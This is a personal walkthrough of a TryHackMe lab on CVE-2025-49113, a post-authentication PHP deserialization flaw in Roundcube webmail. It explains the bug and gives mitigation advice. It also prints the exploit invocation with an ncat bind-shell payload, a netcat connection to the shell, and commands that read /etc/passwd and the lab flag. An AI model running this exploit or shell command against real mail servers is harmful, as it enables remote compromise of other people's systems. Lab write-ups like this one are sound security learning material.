# CVE-2025-49113 — Roundcube Post-Auth RCE

This is my write-up for CVE-2025-49113. I tested everything inside TryHackMe using their hosted lab VMs and the AttackBox. All testing was done in that sandbox — nothing on real systems.

---

## Overview

Roundcube, a popular webmail service, had a deserialization bug that lets an authenticated user run code on the server. The problem is the app deserializes a crafted PHP object coming from a request parameter (`_from`) in `upload.php`. That parameter wasn't validated before deserializing, so a crafted payload leads to RCE.

The lab ships Roundcube 1.6.10. Patches were released in 1.6.11 / 1.5.10 on June 1st 2025. If you run into this in the wild: upgrade immediately.

---

## Lab notes

- Target URL (example in lab): `http://Website_IP/roundcube`   
- PoC repo used in the room: `https://github.com/fearsoff-org/CVE-2025-49113`  
- PoC script in the repo: `CVE-2025-49113.php` — it logs in, crafts the serialized object, injects it via `_from` to `upload.php`, and triggers deserialization.

---

## How the exploit works

1. The app reads a request parameter (`_from`) and deserializes it without strict validation.  
2. PHP object deserialization can call magic methods or otherwise cause code execution if the class structure and payload match server-side classes.  
3. The PoC builds a serialized PHP object that, when deserialized by Roundcube, triggers arbitrary command execution.  
4. The exploit flow in the PoC:
   - Get CSRF token and session cookie
   - Login with valid credentials
   - Craft malicious serialized object and URL-encode it
   - POST to `upload.php` with `_from` set to the crafted payload
   - The server deserializes it and runs the payload

Because the server runs PHP and Roundcube's code contains classes that can be abused, deserialization becomes RCE.

---

## Steps I followed in the lab

1. Start the AttackBox and the target VM in TryHackMe.  
2. Open the vulnerable Roundcube instance in AttackBox browser:  
   `http://Website_IP/roundcube`  
3. Test login using the provided user: `ellieptic` / `ChangeMe123`.  
4. On the AttackBox terminal, clone the PoC repo onto the vm:

   4-space indented code sample for cloning:
   
       git clone https://github.com/fearsoff-org/CVE-2025-49113
       cd CVE-2025-49113

5. Run the exploit with 4 arguments: target_url username password command. Example used in the lab:

   4-space indented command to run exploit:
   
       php CVE-2025-49113.php http://Website_IP/roundcube ellieptic ChangeMe123 "ncat -lvnp 4444 -e /bin/bash"

6. On the AttackBox, start a listener:

   4-space indented listener example:
   
       nc Website_IP 4444

7. If exploit succeeds, you'll get a shell on the target. Example checks shown in lab:

   4-space indented shell commands:
   
       pwd
       whoami

   Typical output in this specific lab will show `/var/www/html/roundcube` and `www-data`.

Note: the PoC can print some errors while still working. If the script complains about CSRF token not found, wait a minute and check the listener, the payload may have executed anyway.

---

## What I did after I landed a shell

1. Enumerated the system quickly:
   
   4-space indented commands:
   
       cat /etc/passwd
       id
       ls -la /var/www/html/roundcube

2. Looked for the flag placed in `/etc` per the lab:

   4-space indented command:
   
       cat /etc/flag.txt

   The lab flag: `THM{ICE_CUBE_DESERIALISATION}`

3. Answered the lab questions:
   - One of the users with first name "Maggie" — her last name in the lab was `Byte`.
   - Flag value in `/etc`: `THM{ICE_CUBE_DESERIALISATION}`

---

## Why this vulnerability is dangerous

- Requires only valid Roundcube credentials (post-auth). Many instances are hosted for many users — if an account is compromised, this is immediate RCE.
- Serialized payloads can be crafted to call internal classes and magic methods; that makes deserialization a powerful primitive.
- The exploit traffic looks like normal POST requests with a single parameter changed — easy to miss without targeted logging or filters.

---

## Mitigation

- Upgrade Roundcube to the fixed versions (1.6.11 / 1.5.10).  
- Ensure input validation before any deserialization; never deserialize untrusted user input.  
- Use strict allowlists for parameters and validate `_from` or remove it from trusted deserialization flows.  
- Add WAF rules to log or block suspicious `_from` values while patching.  
- Monitor for unusual POSTs to `upload.php` and for any suspicious chains that include serialized payloads.

---


## Short takeaway

Deserialization bugs are still a big deal. If your app deserializes data that can be influenced by users, you need strict validation or avoid deserialization altogether.
